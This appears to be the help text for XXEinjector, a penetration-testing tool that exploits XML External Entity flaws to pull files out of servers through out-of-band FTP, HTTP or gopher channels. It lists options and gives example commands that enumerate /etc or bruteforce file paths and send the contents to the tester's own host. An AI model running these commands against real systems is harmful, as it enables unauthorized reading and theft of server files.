XXEinjector by Jakub Palaczynski

XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

Options:<br />
  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)<br />
  --path	Mandatory (or --brute) - Path to enumerate. (--path=/etc)<br />
  --file	Mandatory - File containing HTTP request. Entity in request file needs to point to file.dtd on XXEinjector HTTP server. Issue --xml to show sample HTTP request. (--file=/tmp/req.txt)<br />
  --brute	Mandatory (or --path) - File with paths to bruteforce. (--brute=/tmp/brute.txt)<br />

  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)<br />
  --phpfilter		Use PHP filter to base64 encode target file before sending.<br />

  --ssl		Use SSL.<br />
  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)<br />
  --httpport	Set custom HTTP port. (--httpport=80)<br />
  --ftpport	Set custom FTP port. (--ftpport=21)<br />
  --gopherport	Set custom gopher port. (--gopherport=70)<br />

  --timeout	Timeout for receiving file/directory content. (--timeout=20)<br />
  --fast	Skip asking what to enumerate. Prone to false-positives.<br />
  --verbose	Show verbose messages.<br />

Example usage:<br />
  Enumerating /etc directory in HTTPS application:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080<br />
  Enumerating /etc directory using gopher for OOB method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />
  Bruteforcing files using HTTP out of band method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http
